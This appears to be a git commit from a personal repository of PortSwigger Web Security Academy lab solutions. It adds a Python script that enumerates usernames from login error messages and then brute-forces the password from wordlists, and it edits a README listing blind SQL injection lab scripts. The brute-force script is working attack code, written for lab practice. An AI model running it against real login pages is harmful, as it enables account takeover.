23ba26afd97202ae05c07a8bef8275afee9bd089
Sergio M <hello@sergiomoya.es>
2023-04-02 00:54:48 +0200

    Authentication

---
+++ Authentication/Lab 1 - Username enumeration.py
@@ -0,0 +1,77 @@
+# PortSwigger
+# Lab: Username enumeration via different responses
+
+# Note.
+# It doesn't seem like the best solution, but seeing how the website reacts to the attack, it's a good solution.
+
+import sys
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Target Data
+url = ""
+session = ""
+
+# Localhost Proxies (To intercept with Burp Suite)
+proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }
+
+# Request Cookies
+cookies = {
+    "session": session
+}
+
+def read_file(path):
+    file = open(path, "r")
+    list_lines = file.readlines()
+    file.close()
+    return list_lines
+
+def main():
+    user_name = ''
+    password = ''
+
+    list_users = read_file('.\Authentication/usernames.txt')
+    list_passwords = read_file('.\Authentication/passwords.txt')
+
+    print("\r(+) Forcing user name...")
+    for user in list_users:
+        user = user.strip()
+
+        sys.stdout.write("\r%s" % user)
+        sys.stdout.flush()
+
+        playload = f"username={user}&password=0"        
+        response = requests.post(url, data=playload, cookies=cookies, verify=False, proxies=proxies)
+
+        sys.stdout.write("\r%s" % (" " * len(user)))
+        sys.stdout.flush()
+
+        if response.text.count("Incorrect password") >= 1:
+            user_name = user
+            break
+    
+    print('\r(+) The username is %s' % user_name)
+
+    print("\r(+) Forcing password...")
+    for pwd in list_passwords:
+        pwd = pwd.strip()
+        sys.stdout.write("\r%s" % pwd)
+        sys.stdout.flush()
+
+        playload = f"username={user_name}&password={pwd}"
+        response = requests.post(url, data=playload, cookies=cookies, verify=False, proxies=proxies)
+
+        sys.stdout.write("\r%s" % (" " * len(pwd)))
+        sys.stdout.flush()
+
+        if response.text.count("Incorrect password") == 0:
+            password = pwd
+            break
+
+    print('\r(+) The password is %s' % password)
+
+
+if __name__ == "__main__":
+    main()
--- SQL injection/README.md
+++ SQL injection/README.md
@@ -1,14 +1,6 @@
-# PortSwigger-Labs
-Web Security Academy 
+# SQL Injection
 
-https://portswigger.net/web-security
-
-## SQL Injection
 - [Lab 11: Blind SQL injection with conditional responses.](./SQL%20injection/Lab11%20-%20Conditional%20Responses.py)
 - [Lab 12: Blind SQL injection with conditional errors.](./SQL%20injection/Lab12%20-%20Conditional%20Errors.py)
 - [Lab 13: Blind SQL injection with time delays.](./SQL%20injection/Lab13%20-%20Time%20Delays.py)
 - [Lab 14: Blind SQL injection with time delays and information retrieval.](./SQL%20injection/Lab14%20-%20Time%20Delays%20And%20Information%20Retrieval.py)
-
-## Authentication
-- [Lab 1: Username enumeration via different responses.](./Authentication/Lab%201%20-%20Username%20enumeration.py)
-- [Lab 4: Username enumeration via subtly different responses](./Authentication/Lab%204%20-%20Username%20enumeration%20via%20subtly%20different%20responses.py)
